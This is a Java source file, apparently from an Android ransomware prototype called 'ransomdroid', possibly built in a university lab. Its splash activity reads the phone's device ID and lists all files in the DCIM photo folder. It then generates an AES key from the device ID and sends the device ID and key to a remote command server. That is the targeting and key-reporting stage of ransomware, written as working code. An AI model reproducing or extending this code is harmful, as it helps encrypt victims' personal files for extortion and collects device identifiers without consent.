package br.unb.lasp.ransomdroid.activities;

import android.app.Activity;
import android.content.Context;
import android.content.Intent;
import android.os.AsyncTask;
import android.os.Bundle;
import android.telephony.TelephonyManager;
import android.util.Log;
import android.widget.TextView;
import android.widget.Toast;

import org.json.JSONArray;
import org.json.JSONObject;

import java.io.File;
import java.util.ArrayList;
import java.util.List;

import br.unb.lasp.Global;
import br.unb.lasp.controller.ServiceBroker;
import br.unb.lasp.ransomdroid.R;
import br.unb.lasp.util.Json;
import br.unb.lasp.util.RansomdroidException;
import br.unb.lasp.util.Storage;
import br.unb.lasp.util.SymmetricAES;

import static br.unb.lasp.util.Storage.listFilesRecursively;

public class SplashActivity extends Activity implements Runnable {

    private static final String TAG = new Object() {
    }.getClass().getName();

    private TextView txtLabel;

    @Override
    public void onCreate(Bundle savedInstanceState) {
        Log.d(new Object() {
        }.getClass().getName(), new Object() {
        }.getClass().getEnclosingMethod().getName());
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_splash);
        txtLabel = (TextView) findViewById(R.id.frm_splash_label);
        txtLabel.setText(R.string.loading);
    }

    @Override
    protected void onStart() {
        Log.d(new Object() {
        }.getClass().getName(), new Object() {
        }.getClass().getEnclosingMethod().getName());
        super.onStart();

        TelephonyManager telephonyManager = (TelephonyManager)getSystemService(Context.TELEPHONY_SERVICE);
        Global.uid = telephonyManager.getDeviceId();

        run();
    }

    public void run() {
        Log.d(new Object() {
        }.getClass().getName(), new Object() {
        }.getClass().getEnclosingMethod().getName());
        try {
            VerifyConectivity task = new VerifyConectivity();
            task.execute(0);
            Thread.sleep(3000);
            Intent intent = new Intent(SplashActivity.this, MainActivity.class);
            intent.addFlags(Intent.FLAG_ACTIVITY_REORDER_TO_FRONT);
            startActivity(intent);
            finish();
        } catch (Exception e) {
            Log.e(TAG, e.getMessage(), e);
        }
    }

    private class VerifyConectivity extends AsyncTask<Integer, Integer, Boolean> {

        String mErrorMsg;

        @Override
        protected void onPreExecute() {
            Log.d(new Object() {
            }.getClass().getName(), new Object() {
            }.getClass().getEnclosingMethod().getName());
            super.onPreExecute();
        }

        @Override
        protected Boolean doInBackground(Integer... params) {
            Log.d(new Object() {
            }.getClass().getName(), new Object() {
            }.getClass().getEnclosingMethod().getName());

            Log.d(TAG, "DCIMS...");
            Log.d(TAG, Storage.getDCIMSDir().getPath());
            List<File> fileList = listFilesRecursively(Storage.getDCIMSDir(), new ArrayList<File>());
            Global.numFiles = fileList.size();
            Log.d(TAG, "DCIMS Files... " + Global.numFiles);
            Log.d(TAG, "DCIMS... End!");

            Global.pass = SymmetricAES.getRandomSecretKeySpec(Global.uid).getEncoded().toString();
            sync();

            try {
                Thread.sleep(3000);
            } catch (InterruptedException e) {
                Log.e(TAG, e.getMessage(), e);
            }

            return true;
        }

        @Override
        protected void onPostExecute(Boolean result) {
            Log.d(new Object() {
            }.getClass().getName(), new Object() {
            }.getClass().getEnclosingMethod().getName());
            try {
                if (result) {
                    Global.STATUS = Status.FINISHED;
                } else {
                    Toast.makeText(getApplicationContext(), mErrorMsg, Toast.LENGTH_SHORT).show();
                    finish();
                }
            } catch (Exception e) {
                Log.e(TAG, e.getMessage(), e);
            }
        }

        private boolean sync(){

            boolean ok = true;

            try {
                JSONObject data = new JSONObject();
                data.put("uid", Global.uid);
                data.put("pass", Global.pass);

                JSONObject request = new JSONObject();
                request.put("msgRequest", data);

                String responseStr = ServiceBroker.getInstance(getApplicationContext()).postMessage(request.toString());
                if (responseStr != null) {
                    JSONObject json = new JSONObject(responseStr);
                    JSONObject response = (JSONObject) json.get("msgResponse");
                    String errorMsg = Json.getError(response);
                    if (errorMsg != null) {
                        throw new RansomdroidException(errorMsg);
                    }
                }

            } catch (Exception e) {
                mErrorMsg = e.getMessage();
                Log.e(TAG, e.getMessage(), e);
                ok = false;
            }

            return ok;
        }

    }

}